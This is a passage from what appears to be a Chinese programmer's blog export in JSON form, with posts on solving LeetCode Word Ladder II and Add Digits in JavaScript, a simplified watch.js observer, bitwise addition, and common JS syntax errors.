}\\n\\n                }\\n                if(param.size==0){\\n                    return lu;\\n                }\\n                lu=temps;\\n              return  change(Array.from(param))\\n            }\\n            return  change([endWord])\\n        };//终于通过了。但还是很慢。leetcode用了1800+ms，不知道别人用js只花了300ms是怎么写的，和c++差不多速度了。以后再优化。用双BFS试试\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Given two words (beginWord and endWord), and a dictionary's word list, find all shortest transformation sequence(s) from beginWord to endWord, such that:</p>\n<p>Only one letter can be changed at a time<br>\nEach intermediate word must exist in the word list<br>\nFor example,</p>\n<p>Given:<br>\nbeginWord = &quot;hit&quot;<br>\nendWord = &quot;cog&quot;<br>\nwordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]<br>\nReturn<br>\n[<br>\n[&quot;hit&quot;,&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;cog&quot;],<br>\n[&quot;hit&quot;,&quot;hot&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]<br>\n]<br>\nNote:<br>\nAll words have the same length.<br>\nAll words contain only lowercase alphabetic characters.</p>\n<p>从beginWord开始经过wordList到endWord结束。一次只能变一个字母。注意：wordList所有的字母都相同的长度，都是小写。 这是一个无向图。[&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;] 先来个邻接矩阵</p>\n<pre><code>     hit hot dot dog lot log cog\nhit   0   1   0   0   0   0   0\nhot   1   0   1   0   1   0   0\ndot   0   1   0   1   1   0   0\ndog   0   0   1   0   0   1   1\nlot   0   1   1   0   0   1   0\nlog   0   0   0   1   1   0   1\ncog   0   0   0   1   0   1   0\n</code></pre>\n<pre><code>        var findLadders = function(beginWord, endWord, wordList) {\n            Array.prototype.indexOf = function(val) {    //数组处理\n                for (var i = 0; i &lt; this.length; i++) {\n                    if (this[i] == val) return i;\n                }\n                return -1;\n            };\n            function compare(a,b){\n                var s=0;\n                for(var i=0;i&lt; a.length;i++){\n                   if(a.charAt(i) !=b.charAt(i)) {\n                       s++;\n                   }\n                }\n                if(s&gt;1){\n                    return false;\n                }\n                return true;\n            }\n            var arr=[];\n            wordList.unshift(beginWord);\n            wordList.push(endWord);\n            for(var x in wordList){\n                arr[x]=[];\n            }\n            for(var i=0;i&lt;wordList.length;i++){\n                arr[i][i]=0;\n                for(var j=i+1;j&lt;wordList.length;j++){\n                    if(compare(wordList[i],wordList[j])){\n                        arr[i][j]=1;\n                        arr[j][i]=1;   //利用无向图对称性\n                    }else{\n                        arr[i][j]=0;\n                        arr[j][i]=0;    //利用无向图对称性\n                    }\n                }\n            }\n            var open=[];\n            var results=[]\n\n            function to(a){\n                if(a==wordList.length-1){\n                    var res=[]\n                    for(var i=0;i&lt;open.length;i++){                    \n                        res.push(wordList[open[i]])\n                    }\n                    res.push(wordList[wordList.length-1])\n                    results.push(res);\n                    open.pop();\n                    return;\n                }\n                for(var x in arr[a]){\n                    if(arr[a][x]==1&amp;&amp;open.indexOf(x)&lt;0){\n                        open.push(a)\n                      //      open.push(x)   //\n                        to(x);\n                    }\n                }\n                open.pop();\n            }\n            to(0);\n           console.log(results)\n            return results\n        };\n        findLadders(&quot;hit&quot;,&quot;cog&quot;,[&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;])\n//主意leetcode给的wordList是set数据结构，不是Array。还有，这里求的是所有的解。不是最短的。但是可以在最后只留下最短的路径。用的DFS。\n</code></pre>\n<p>上面那个肯定是不行的。回报超时的错误。权值一样，下面的换了BFS+剪枝的思想。因为是求最短路径，把已经遍历的直接删除。没用邻接矩阵，必要时再计算。</p>\n<pre><code>           var findLadders = function(beginWord, endWord, wordList) {\n            function compare(a, b) {\n                var s = 0;\n                for (var i = 0; i &lt; a.length; i++) {\n                    if (a.charAt(i) != b.charAt(i)) {\n                        s++;\n                    }\n                }\n                if (s &gt; 1) {\n                    return false;\n                }\n                return true;\n            }\n            wordList.add(beginWord)\n            wordList.add(endWord)\n///////////////////////////////////////////////////////\n            var results = [];\n            function to(p) {\n                for(var value in p){\n                    wordList.delete(p[value])\n                }\n                var param= new Set();\n                var temps=[];\n\n                for (var q in p){\n                    var  a=p[q];\n                    if (a == endWord) {\n                        return;\n                    }\n                    wordList.forEach(function(j) {\n                            if (compare(a, j)) {\n                                for (var i in results) {\n                                    if (results[i][results[i].length - 1] == a) {\n                                        var temp = results[i].concat(j)\n                                        temps.push(temp)\n                                    }\n                                }\n                                param.add(j)\n                            }\n                    })\n                    }\n                results=temps;\n                if(param.size==0){return false}\n                param=Array.from(param);\n                to(param);\n            }\n            results.push([beginWord])\n            to([beginWord]);\n            var tempResults=[]\n            for(var h in results){\n                if(results[h][results[h].length-1]==endWord){\n                    tempResults.push(results[h])\n                }\n            }\n           console.log(tempResults)\n            return tempResults;\n        };\n    //   findLadders(&quot;hit&quot;,&quot;cog&quot;,[&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;])\n   \n  \n        findLadders(&quot;sand&quot;,&quot;acne&quot;,[&quot;slit&quot;,````(2853???),&quot;lame&quot;])\n</code></pre>\n<p>这个是修改版的，输入规模到了2855个时，还是会超时。虽然解如图。最少11步，一共11个解。用Chrome控制台运行要3秒多，出结果。</p>\n<p>发现记录路径那里还是慢，因为从beginWord记录，用的数组+遍历。换成hash（js中的hash是ES6的Map，但是，这里用Object，Object（key为string，value为Array））记录反向的关系。从beginWord开始，由图生成树，然后，从endWord开始，反向遍历树，只要最短的路径。</p>\n<pre><code>  var findLadders = function(beginWord, endWord, wordList) {\n            var solve={};\n            solve.$set=function(property,value){\n                if( this[property]==undefined){\n                    this[property]=value;\n                }else{\n                    Array.prototype.push.apply(this[property], value);\n                }\n            }\n            function compare(a, b) {\n                var s = false;\n                for (var i = 0; i &lt; a.length; i++) {\n                    if (a.charAt(i) != b.charAt(i)) {\n                        if(s){return false}\n                        s=true;\n                    }\n                }\n                return true;\n            }\n            wordList.add(beginWord)\n            wordList.add(endWord)\n            function to(p) {\n                for(var value in p){\n                    wordList.delete(p[value])\n                }\n                var param= new Set();\n                var temps=[];\n                for (var q in p){\n                    var child=[];\n                    var  a=p[q];\n                    if (a == endWord) {\n                        return;\n                    }\n                    wordList.forEach(function(j) {\n                            if (compare(a, j)) {\n                                solve.$set(j,[a]);\n                                param.add(j)\n                            }\n                    })\n                }\n                if(param.size==0){return 0}\n                param=Array.from(param);\n                to(param);\n            }\n            if(to([beginWord])==0){\n                return [];\n            };\n            var lu=[[endWord]]\n            function change(endWords){\n                var param= new Set();\n                var  temps=[];\n                for(var p in endWords){\n                    var endWord=endWords[p]\n                    if(solve[endWord]!=undefined) {\n                            for(var x in solve[endWord]){\n                                for (var i in lu) {\n                                    if (lu[i][0] === endWord) {\n                                        var temp = [solve[endWord][x]].concat(lu[i])\n                                        temps.push(temp)\n                                    }\n                                }\n                                param.add(solve[endWord][x])\n                            }\n                    }\n\n                }\n                if(param.size==0){\n                    return lu;\n                }\n                lu=temps;\n              return  change(Array.from(param))\n            }\n            return  change([endWord])\n        };//终于通过了。但还是很慢。leetcode用了1800+ms，不知道别人用js只花了300ms是怎么写的，和c++差不多速度了。以后再优化。用双BFS试试\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"17","plaintext":"Given two words (beginWord and endWord), and a dictionary's word list, find all\nshortest transformation sequence(s) from beginWord to endWord, such that:\n\nOnly one letter can be changed at a time\nEach intermediate word must exist in the word list\nFor example,\n\nGiven:\nbeginWord = \"hit\"\nendWord = \"cog\"\nwordList = [\"hot\",\"dot\",\"dog\",\"lot\",\"log\"]\nReturn\n[\n[\"hit\",\"hot\",\"dot\",\"dog\",\"cog\"],\n[\"hit\",\"hot\",\"lot\",\"log\",\"cog\"]\n]\nNote:\nAll words have the same length.\nAll words contain only lowercase alphabetic characters.\n\n从beginWord开始经过wordList到endWord结束。一次只能变一个字母。注意：wordList所有的字母都相同的长度，都是小写。\n这是一个无向图。[\"hot\",\"dot\",\"dog\",\"lot\",\"log\"] 先来个邻接矩阵\n\n     hit hot dot dog lot log cog\nhit   0   1   0   0   0   0   0\nhot   1   0   1   0   1   0   0\ndot   0   1   0   1   1   0   0\ndog   0   0   1   0   0   1   1\nlot   0   1   1   0   0   1   0\nlog   0   0   0   1   1   0   1\ncog   0   0   0   1   0   1   0\n\n\n        var findLadders = function(beginWord, endWord, wordList) {\n            Array.prototype.indexOf = function(val) {    //数组处理\n                for (var i = 0; i < this.length; i++) {\n                    if (this[i] == val) return i;\n                }\n                return -1;\n            };\n            function compare(a,b){\n                var s=0;\n                for(var i=0;i< a.length;i++){\n                   if(a.charAt(i) !=b.charAt(i)) {\n                       s++;\n                   }\n                }\n                if(s>1){\n                    return false;\n                }\n                return true;\n            }\n            var arr=[];\n            wordList.unshift(beginWord);\n            wordList.push(endWord);\n            for(var x in wordList){\n                arr[x]=[];\n            }\n            for(var i=0;i<wordList.length;i++){\n                arr[i][i]=0;\n                for(var j=i+1;j<wordList.length;j++){\n                    if(compare(wordList[i],wordList[j])){\n                        arr[i][j]=1;\n                        arr[j][i]=1;   //利用无向图对称性\n                    }else{\n                        arr[i][j]=0;\n                        arr[j][i]=0;    //利用无向图对称性\n                    }\n                }\n            }\n            var open=[];\n            var results=[]\n\n            function to(a){\n                if(a==wordList.length-1){\n                    var res=[]\n                    for(var i=0;i<open.length;i++){                    \n                        res.push(wordList[open[i]])\n                    }\n                    res.push(wordList[wordList.length-1])\n                    results.push(res);\n                    open.pop();\n                    return;\n                }\n                for(var x in arr[a]){\n                    if(arr[a][x]==1&&open.indexOf(x)<0){\n                        open.push(a)\n                      //      open.push(x)   //\n                        to(x);\n                    }\n                }\n                open.pop();\n            }\n            to(0);\n           console.log(results)\n            return results\n        };\n        findLadders(\"hit\",\"cog\",[\"hot\",\"dot\",\"dog\",\"lot\",\"log\"])\n//主意leetcode给的wordList是set数据结构，不是Array。还有，这里求的是所有的解。不是最短的。但是可以在最后只留下最短的路径。用的DFS。\n\n\n上面那个肯定是不行的。回报超时的错误。权值一样，下面的换了BFS+剪枝的思想。因为是求最短路径，把已经遍历的直接删除。没用邻接矩阵，必要时再计算。\n\n           var findLadders = function(beginWord, endWord, wordList) {\n            function compare(a, b) {\n                var s = 0;\n                for (var i = 0; i < a.length; i++) {\n                    if (a.charAt(i) != b.charAt(i)) {\n                        s++;\n                    }\n                }\n                if (s > 1) {\n                    return false;\n                }\n                return true;\n            }\n            wordList.add(beginWord)\n            wordList.add(endWord)\n///////////////////////////////////////////////////////\n            var results = [];\n            function to(p) {\n                for(var value in p){\n                    wordList.delete(p[value])\n                }\n                var param= new Set();\n                var temps=[];\n\n                for (var q in p){\n                    var  a=p[q];\n                    if (a == endWord) {\n                        return;\n                    }\n                    wordList.forEach(function(j) {\n                            if (compare(a, j)) {\n                                for (var i in results) {\n                                    if (results[i][results[i].length - 1] == a) {\n                                        var temp = results[i].concat(j)\n                                        temps.push(temp)\n                                    }\n                                }\n                                param.add(j)\n                            }\n                    })\n                    }\n                results=temps;\n                if(param.size==0){return false}\n                param=Array.from(param);\n                to(param);\n            }\n            results.push([beginWord])\n            to([beginWord]);\n            var tempResults=[]\n            for(var h in results){\n                if(results[h][results[h].length-1]==endWord){\n                    tempResults.push(results[h])\n                }\n            }\n           console.log(tempResults)\n            return tempResults;\n        };\n    //   findLadders(\"hit\",\"cog\",[\"hot\",\"dot\",\"dog\",\"lot\",\"log\"])\n   \n  \n        findLadders(\"sand\",\"acne\",[\"slit\",````(2853???),\"lame\"])\n\n\n这个是修改版的，输入规模到了2855个时，还是会超时。虽然解如图。最少11步，一共11个解。用Chrome控制台运行要3秒多，出结果。\n\n发现记录路径那里还是慢，因为从beginWord记录，用的数组+遍历。换成hash（js中的hash是ES6的Map，但是，这里用Object，Object（key为string，value为Array））记录反向的关系。从beginWord开始，由图生成树，然后，从endWord开始，反向遍历树，只要最短的路径。\n\n  var findLadders = function(beginWord, endWord, wordList) {\n            var solve={};\n            solve.$set=function(property,value){\n                if( this[property]==undefined){\n                    this[property]=value;\n                }else{\n                    Array.prototype.push.apply(this[property], value);\n                }\n            }\n            function compare(a, b) {\n                var s = false;\n                for (var i = 0; i < a.length; i++) {\n                    if (a.charAt(i) != b.charAt(i)) {\n                        if(s){return false}\n                        s=true;\n                    }\n                }\n                return true;\n            }\n            wordList.add(beginWord)\n            wordList.add(endWord)\n            function to(p) {\n                for(var value in p){\n                    wordList.delete(p[value])\n                }\n                var param= new Set();\n                var temps=[];\n                for (var q in p){\n                    var child=[];\n                    var  a=p[q];\n                    if (a == endWord) {\n                        return;\n                    }\n                    wordList.forEach(function(j) {\n                            if (compare(a, j)) {\n                                solve.$set(j,[a]);\n                                param.add(j)\n                            }\n                    })\n                }\n                if(param.size==0){return 0}\n                param=Array.from(param);\n                to(param);\n            }\n            if(to([beginWord])==0){\n                return [];\n            };\n            var lu=[[endWord]]\n            function change(endWords){\n                var param= new Set();\n                var  temps=[];\n                for(var p in endWords){\n                    var endWord=endWords[p]\n                    if(solve[endWord]!=undefined) {\n                            for(var x in solve[endWord]){\n                                for (var i in lu) {\n                                    if (lu[i][0] === endWord) {\n                                        var temp = [solve[endWord][x]].concat(lu[i])\n                                        temps.push(temp)\n                                    }\n                                }\n                                param.add(solve[endWord][x])\n                            }\n                    }\n\n                }\n                if(param.size==0){\n                    return lu;\n                }\n                lu=temps;\n              return  change(Array.from(param))\n            }\n            return  change([endWord])\n        };//终于通过了。但还是很慢。leetcode用了1800+ms，不知道别人用js只花了300ms是怎么写的，和c++差不多速度了。以后再优化。用双BFS试试","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-25T07:31:16.000Z","created_by":"1","updated_at":"2017-01-17T06:59:06.000Z","updated_by":"1","published_at":"2016-02-27T09:35:21.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d1","uuid":"9f9a6919-c26a-45bc-8b40-23667cffe7a8","title":"Watch.js源码解析","slug":"watch-jsyuan-ma-jie-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"一个简化的watch.js代码。\\n```\\n    var a={name:'ad',age:18};\\n    var stu={stuName:a};\\n\\n\\n\\n    function Watch(x,prop,callback){\\n        Array.prototype.indexOf = function (val) {\\n        for (var i = 0; i < this.length; i++) {\\n            if (this[i] == val) {\\n                return i;\\n            }\\n        }\\n        return -1;\\n    };\\n    Array.prototype.remove = function (val) {\\n        var index = this.indexOf(val);\\n        if (index > -1) {\\n            this.splice(index, 1);\\n        }\\n    };\\n\\n        function removeFrom(x,arr){\\n            for(var j in arr){\\n                if(arr[j]==x){\\n                    arr.splice(j, 1);\\n                }\\n            }\\n        }\\n        var value=x[prop];\\n        if(x.watchers==null){\\n            x.watchers={};\\n        }\\n\\n        if(x.watchers[prop]==null){\\n            x.watchers[prop]=[];\\n        }\\n        x.watchers[prop].push(callback)\\n        if(value instanceof  Object){\\n            for(var i in value){\\n                if(i!='watchers'){\\n                    Watch(value,i,callback);\\n                }\\n            }\\n        }\\n\\n        Object.defineProperty( x, prop, {\\n            enumerable: true,\\n            configurable: true,\\n            get: function() {\\n                return value;\\n            },\\n            set: function(v){setter(v)}\\n        });\\n        x.__defineGetter__(prop, function() {\\n            return value;\\n        })\\n        x.__defineSetter__(prop,function(v){setter(v)})\\n        var setter=function(v){\\n\\n                if(value instanceof  Object){\\n                    for(var j in value['watchers']) {\\n                        //    value['watchers'][j].remove(callback)\\n                        removeFrom(callback,value['watchers'][j]);\\n                    }\\n                }\\n                for(var i in x.watchers[prop]){\\n                    x.watchers[prop][i](v,value);\\n                }\\n                value = v;\\n                if(v instanceof  Object){\\n                    for(var j in v) {\\n                        Watch(v,j,callback);\\n                    }\\n                }\\n                //    callback(v);\\n                //     callbacks.push(callback(v));\\n            }\\n\\n    }\\n\\n\\n    Watch(a,'name',function(newValue){alert(\\\"a我被改变了\\\"+newValue )});\\n    Watch(stu,'stuName',function(newValue,oldValue){alert(\\\"stu我被改变了\\\"+newValue+\\\",\\\"+ oldValue)});\\n\\n    a.name='ap';\\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>一个简化的watch.js代码。</p>\n<pre><code>    var a={name:'ad',age:18};\n    var stu={stuName:a};\n\n\n\n    function Watch(x,prop,callback){\n        Array.prototype.indexOf = function (val) {\n        for (var i = 0; i &lt; this.length; i++) {\n            if (this[i] == val) {\n                return i;\n            }\n        }\n        return -1;\n    };\n    Array.prototype.remove = function (val) {\n        var index = this.indexOf(val);\n        if (index &gt; -1) {\n            this.splice(index, 1);\n        }\n    };\n\n        function removeFrom(x,arr){\n            for(var j in arr){\n                if(arr[j]==x){\n                    arr.splice(j, 1);\n                }\n            }\n        }\n        var value=x[prop];\n        if(x.watchers==null){\n            x.watchers={};\n        }\n\n        if(x.watchers[prop]==null){\n            x.watchers[prop]=[];\n        }\n        x.watchers[prop].push(callback)\n        if(value instanceof  Object){\n            for(var i in value){\n                if(i!='watchers'){\n                    Watch(value,i,callback);\n                }\n            }\n        }\n\n        Object.defineProperty( x, prop, {\n            enumerable: true,\n            configurable: true,\n            get: function() {\n                return value;\n            },\n            set: function(v){setter(v)}\n        });\n        x.__defineGetter__(prop, function() {\n            return value;\n        })\n        x.__defineSetter__(prop,function(v){setter(v)})\n        var setter=function(v){\n\n                if(value instanceof  Object){\n                    for(var j in value['watchers']) {\n                        //    value['watchers'][j].remove(callback)\n                        removeFrom(callback,value['watchers'][j]);\n                    }\n                }\n                for(var i in x.watchers[prop]){\n                    x.watchers[prop][i](v,value);\n                }\n                value = v;\n                if(v instanceof  Object){\n                    for(var j in v) {\n                        Watch(v,j,callback);\n                    }\n                }\n                //    callback(v);\n                //     callbacks.push(callback(v));\n            }\n\n    }\n\n\n    Watch(a,'name',function(newValue){alert(&quot;a我被改变了&quot;+newValue )});\n    Watch(stu,'stuName',function(newValue,oldValue){alert(&quot;stu我被改变了&quot;+newValue+&quot;,&quot;+ oldValue)});\n\n    a.name='ap';\n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"18","plaintext":"一个简化的watch.js代码。\n\n    var a={name:'ad',age:18};\n    var stu={stuName:a};\n\n\n\n    function Watch(x,prop,callback){\n        Array.prototype.indexOf = function (val) {\n        for (var i = 0; i < this.length; i++) {\n            if (this[i] == val) {\n                return i;\n            }\n        }\n        return -1;\n    };\n    Array.prototype.remove = function (val) {\n        var index = this.indexOf(val);\n        if (index > -1) {\n            this.splice(index, 1);\n        }\n    };\n\n        function removeFrom(x,arr){\n            for(var j in arr){\n                if(arr[j]==x){\n                    arr.splice(j, 1);\n                }\n            }\n        }\n        var value=x[prop];\n        if(x.watchers==null){\n            x.watchers={};\n        }\n\n        if(x.watchers[prop]==null){\n            x.watchers[prop]=[];\n        }\n        x.watchers[prop].push(callback)\n        if(value instanceof  Object){\n            for(var i in value){\n                if(i!='watchers'){\n                    Watch(value,i,callback);\n                }\n            }\n        }\n\n        Object.defineProperty( x, prop, {\n            enumerable: true,\n            configurable: true,\n            get: function() {\n                return value;\n            },\n            set: function(v){setter(v)}\n        });\n        x.__defineGetter__(prop, function() {\n            return value;\n        })\n        x.__defineSetter__(prop,function(v){setter(v)})\n        var setter=function(v){\n\n                if(value instanceof  Object){\n                    for(var j in value['watchers']) {\n                        //    value['watchers'][j].remove(callback)\n                        removeFrom(callback,value['watchers'][j]);\n                    }\n                }\n                for(var i in x.watchers[prop]){\n                    x.watchers[prop][i](v,value);\n                }\n                value = v;\n                if(v instanceof  Object){\n                    for(var j in v) {\n                        Watch(v,j,callback);\n                    }\n                }\n                //    callback(v);\n                //     callbacks.push(callback(v));\n            }\n\n    }\n\n\n    Watch(a,'name',function(newValue){alert(\"a我被改变了\"+newValue )});\n    Watch(stu,'stuName',function(newValue,oldValue){alert(\"stu我被改变了\"+newValue+\",\"+ oldValue)});\n\n    a.name='ap';","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-25T09:30:00.000Z","created_by":"1","updated_at":"2017-01-17T06:59:42.000Z","updated_by":"1","published_at":"2016-02-25T09:31:30.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d2","uuid":"5cd94b59-716e-4303-b656-7ba13349de05","title":"计算机加法原理","slug":"bu-yong-jia-hao-de-jia-fa-yun-suan","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"在二进制条件下，计算往往是采用逻辑计算的方法实现的，而非四则方法。js源码：\\n```\\nvar add=function(a,b){\\n\\n\\tif(!b){return a;}\\n\\n\\tvar temp1=a^b;\\n\\n\\tvar temp2=(a&b)<<1;\\n\\n\\treturn add(temp1,temp2);\\n\\n}\\nvar c=add(1,2)\\n```\\n举例说明： 12 + 9 = 21\\n\\n* 12的二进制数是 1100;9的二进制数是 1001\\n* 先1100和1001异或计算,temp1=0101;\\n* 逻辑与 然后 右移1位，1000 右移有一位后 temp2=10000;\\n* 继续异或计算， (temp1)0101与(temp2)10000的异或计算 10101\\n* 逻辑与运算结果是00000(不需要进位了)。\\n* 则计算结束。二进制10101就是最终的计算结果，即十进制的21.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>在二进制条件下，计算往往是采用逻辑计算的方法实现的，而非四则方法。js源码：</p>\n<pre><code>var add=function(a,b){\n\n\tif(!b){return a;}\n\n\tvar temp1=a^b;\n\n\tvar temp2=(a&amp;b)&lt;&lt;1;\n\n\treturn add(temp1,temp2);\n\n}\nvar c=add(1,2)\n</code></pre>\n<p>举例说明： 12 + 9 = 21</p>\n<ul>\n<li>12的二进制数是 1100;9的二进制数是 1001</li>\n<li>先1100和1001异或计算,temp1=0101;</li>\n<li>逻辑与 然后 右移1位，1000 右移有一位后 temp2=10000;</li>\n<li>继续异或计算， (temp1)0101与(temp2)10000的异或计算 10101</li>\n<li>逻辑与运算结果是00000(不需要进位了)。</li>\n<li>则计算结束。二进制10101就是最终的计算结果，即十进制的21.</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"19","plaintext":"在二进制条件下，计算往往是采用逻辑计算的方法实现的，而非四则方法。js源码：\n\nvar add=function(a,b){\n\n\tif(!b){return a;}\n\n\tvar temp1=a^b;\n\n\tvar temp2=(a&b)<<1;\n\n\treturn add(temp1,temp2);\n\n}\nvar c=add(1,2)\n\n\n举例说明： 12 + 9 = 21\n\n * 12的二进制数是 1100;9的二进制数是 1001\n * 先1100和1001异或计算,temp1=0101;\n * 逻辑与 然后 右移1位，1000 右移有一位后 temp2=10000;\n * 继续异或计算， (temp1)0101与(temp2)10000的异或计算 10101\n * 逻辑与运算结果是00000(不需要进位了)。\n * 则计算结束。二进制10101就是最终的计算结果，即十进制的21.","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-18T09:35:26.000Z","created_by":"1","updated_at":"2017-01-17T07:07:07.000Z","updated_by":"1","published_at":"2016-02-19T01:10:01.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d3","uuid":"55957611-f43c-42ef-9194-69489b870b15","title":"JS常见调试错误","slug":"jschang-jian-diao-shi-cuo-wu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> after argument list\\n![](/content/images/2016/02/OGJ--D6SZI-3-_4NLOQC-QH.png)\\n\\n一般是少了 \\\",',),} 中的一个,没有成对出现,基本是没有匹配导致的错误。还有没有转义，也可以出现该错误。\\n\\n\\n> Unexpected token ILLEGAL(???)\\n\\n![](/content/images/2016/02/SFI354----1EW--_4F-T0K4.png)\\n\\n一般输入了非法的符号，一般是中文的分号，冒号。出现的错误。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>after argument list<br>\n<img src=\"/content/images/2016/02/OGJ--D6SZI-3-_4NLOQC-QH.png\" alt=\"\"></p>\n</blockquote>\n<p>一般是少了 &quot;,',),} 中的一个,没有成对出现,基本是没有匹配导致的错误。还有没有转义，也可以出现该错误。</p>\n<blockquote>\n<p>Unexpected token ILLEGAL(???)</p>\n</blockquote>\n<p><img src=\"/content/images/2016/02/SFI354----1EW--_4F-T0K4.png\" alt=\"\"></p>\n<p>一般输入了非法的符号，一般是中文的分号，冒号。出现的错误。</p>\n<!--kg-card-end: markdown-->","comment_id":"20","plaintext":"> after argument list\n\n\n\n一般是少了 \",',),} 中的一个,没有成对出现,基本是没有匹配导致的错误。还有没有转义，也可以出现该错误。\n\n> Unexpected token ILLEGAL(???)\n\n\n\n\n一般输入了非法的符号，一般是中文的分号，冒号。出现的错误。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-19T02:50:25.000Z","created_by":"1","updated_at":"2017-01-17T07:06:31.000Z","updated_by":"1","published_at":"2016-02-19T02:55:55.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d4","uuid":"20370719-f603-42c6-bf1e-fe10d328b8f7","title":"Add Digits--LeetCode","slug":"add-digits","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Given a non-negative integer num, repeatedly add all its digits until the result has only one digit.\\n\\nFor example:\\n\\nGiven `num = 38`, the process is like: `3 + 8 = 11`, `1 + 1 = 2`. Since 2 has only one digit, return it.\\n\\nFollow up:\\nCould you do it without any loop/recursion in O(1) runtime?\\n\\n有一个非负整数num，重复这样的操作：对它的各位数字求和，……直到这结果只有一个数字。\\n\\n例如：num=38，3+8=11,1+1=2。因为2小于10，因此返回2。\\n\\n要求时间复杂度为O(1)\\n\\n先写个简单的：\\n```\\nvar addDigits = function(num) {  \\n    var numStr = num.toString();\\n    var result=0;\\n    for(var i=0;i<numStr.length;i++){\\n        result+=Number(numStr.charAt(i));//注意Number比parseInt快（我的测试快 10+ms，一个90+ms，一个100+ms）。\\n    }\\n    if(result<10){\\n        return result;\\n    }else{\\n        return addDigits(result);\\n    }\\n};\\n```\\nO（1）:\\n```\\n38=3*10+8;  \\n38=(3+8)+3*9   (由这个3*(1+9)+8推出)  \\n38=(11)+3*9  \\n38=((1+1)+1*9)+3*9  \\n除（1+1）都能被9整除=>  result=num-9*n。即result=n/9;但是当n=99时，result=0；实际为9。\\n因为99=((0+1*9)+1*9)+9*9。\\n\\nvar addDigits = function(num) {  \\n   if(num===0){return 0;}\\n   var result=num%9;\\n   if(result===0){result=9}\\n   return result;\\n};\\n```\\n最完美的:\\n```\\nfunction addDigits(num) {  \\n        return 1 + (num-1)%9;  //return 2+(num-2)%9\\n    }  \\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Given a non-negative integer num, repeatedly add all its digits until the result has only one digit.</p>\n<p>For example:</p>\n<p>Given <code>num = 38</code>, the process is like: <code>3 + 8 = 11</code>, <code>1 + 1 = 2</code>. Since 2 has only one digit, return it.</p>\n<p>Follow up:<br>\nCould you do it without any loop/recursion in O(1) runtime?</p>\n<p>有一个非负整数num，重复这样的操作：对它的各位数字求和，……直到这结果只有一个数字。</p>\n<p>例如：num=38，3+8=11,1+1=2。因为2小于10，因此返回2。</p>\n<p>要求时间复杂度为O(1)</p>\n<p>先写个简单的：</p>\n<pre><code>var addDigits = function(num) {  \n    var numStr = num.toString();\n    var result=0;\n    for(var i=0;i&lt;numStr.length;i++){\n        result+=Number(numStr.charAt(i));//注意Number比parseInt快（我的测试快 10+ms，一个90+ms，一个100+ms）。\n    }\n    if(result&lt;10){\n        return result;\n    }else{\n        return addDigits(result);\n    }\n};\n</code></pre>\n<p>O（1）:</p>\n<pre><code>38=3*10+8;  \n38=(3+8)+3*9   (由这个3*(1+9)+8推出)  \n38=(11)+3*9  \n38=((1+1)+1*9)+3*9  \n除（1+1）都能被9整除=&gt;  result=num-9*n。即result=n/9;但是当n=99时，result=0；实际为9。\n因为99=((0+1*9)+1*9)+9*9。\n\nvar addDigits = function(num) {  \n   if(num===0){return 0;}\n   var result=num%9;\n   if(result===0){result=9}\n   return result;\n};\n</code></pre>\n<p>最完美的:</p>\n<pre><code>function addDigits(num) {  \n        return 1 + (num-1)%9;  //return 2+(num-2)%9\n    }  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"21","plaintext":"Given a non-negative integer num, repeatedly add all its digits until the result\nhas only one digit.\n\nFor example:\n\nGiven num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one\ndigit, return it.\n\nFollow up:\nCould you do it without any loop/recursion in O(1) runtime?\n\n有一个非负整数num，重复这样的操作：对它的各位数字求和，……直到这结果只有一个数字。\n\n例如：num=38，3+8=11,1+1=2。因为2小于10，因此返回2。\n\n要求时间复杂度为O(1)\n\n先写个简单的：\n\nvar 